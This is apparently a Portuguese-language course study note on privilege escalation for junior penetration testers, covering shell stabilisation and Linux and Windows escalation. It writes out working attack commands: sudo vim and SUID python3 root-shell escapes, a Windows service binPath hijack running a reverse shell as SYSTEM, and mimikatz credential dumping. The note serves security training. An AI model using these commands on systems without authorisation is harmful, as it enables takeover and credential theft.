# Privilege Escalation - Jr Penetration Tester

A Privilege Escalation é uma etapa essencial em um teste de penetração. Após obter acesso inicial a uma máquina (normalmente com permissões limitadas), o próximo passo é tentar elevar privilégios — buscando o nível de root (Linux) ou SYSTEM/Administrador (Windows). Isso dá controle total da máquina, possibilitando movimentação lateral, persistência e domínio completo.

No módulo do Jr Penetration Tester, temos 3 partes principais: What the Shell?, Linux Privilege Escalation e Windows Privilege Escalation.  
Aqui está o conteúdo detalhado 100% dentro do mesmo markdown.

---

## 🔹 What the Shell?
Quando obtemos acesso inicial, geralmente conseguimos uma shell limitada. Antes de escalar privilégios, precisamos estabilizar e identificar que tipo de shell estamos rodando.

### Tipos de Shell
- Reverse Shell → alvo conecta de volta para o atacante.  
- Bind Shell → alvo abre uma porta para conexão.  
- Web Shell → execução de comandos via interface web.  

### Estabilização da Shell (Linux)
Muitas shells iniciais não têm suporte a comandos interativos. Para “upgradear”:

python3 -c 'import pty; pty.spawn("/bin/bash")'  
export TERM=xterm  
CTRL+Z  
stty raw -echo; fg  
reset  

Isso ativa histórico, autocompletar e melhora a experiência.

---

## 🐧 Linux Privilege Escalation

### 1. Enumeração
Primeiro passo: coletar informações.

id                → Identifica o usuário atual  
uname -a          → Versão do kernel  
sudo -l           → Lista permissões sudo  
lsblk             → Lista partições/discos  
ps aux            → Processos em execução  

Ferramentas úteis:  
- LinPEAS → enumeração automatizada.  
- Linux Exploit Suggester → sugere exploits com base no kernel.  
- pspy → observa processos em execução.

### 2. Vetores comuns de escalada
- Permissões sudo mal configuradas (usuário pode rodar binários como root).  
- Arquivos com SUID bit set (executam com privilégios do dono).  
- Serviços mal configurados.  
- Credenciais expostas em arquivos de configuração.  
- Exploração de kernels antigos.  

### 3. Exemplo de Escalada via Sudo
Se o usuário puder rodar `vim` como root:

sudo vim -c ':!/bin/sh'  

Agora temos shell root.

### 4. Exemplo via SUID
Buscar binários com SUID:

find / -perm -4000 2>/dev/null  

Se encontrar `/usr/bin/python3` com SUID:

/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'  

---

## 🪟 Windows Privilege Escalation

### 1. Enumeração
Primeiro passo em Windows é mapear ambiente:

whoami /priv          → mostra privilégios  
systeminfo            → versão do Windows  
net user              → usuários locais  
tasklist              → processos em execução  
ipconfig /all         → rede  

Ferramentas recomendadas:  
- winPEAS → coleta automática de informações.  
- Seatbelt → enumeração avançada.  
- PowerUp → identifica vulnerabilidades de escalada.  

### 2. Vetores comuns de escalada
- Usuário com permissões administrativas.  
- Serviços mal configurados (binários modificáveis).  
- Senhas armazenadas em arquivos, registro ou GPO.  
- DLL Hijacking (carregamento de DLLs maliciosas).  
- Kernel exploits (quando a versão é antiga).  

### 3. Exemplo: Abuso de Serviços
Se o usuário pode modificar um serviço:

sc qc NomeDoServico       → verifica configuração  
sc config NomeDoServico binPath= "C:\Temp\reverse.exe"  
sc start NomeDoServico  

Isso executa nosso binário como SYSTEM.

### 4. Exemplo: Abuso de Senhas em Memória
Com acesso a `mimikatz`:

privilege::debug  
sekurlsa::logonpasswords  

Obtém credenciais em texto claro de sessões ativas.

---

## ✅ Conclusão
A escalada de privilégios é um passo crucial: ela transforma um acesso inicial limitado em controle total da máquina. Tanto no Linux quanto no Windows, o processo começa com **enumeração cuidadosa** e segue para exploração de **vetores comuns**.  
Dominar essas técnicas é essencial para qualquer pentester que deseja avançar além do acesso inicial.
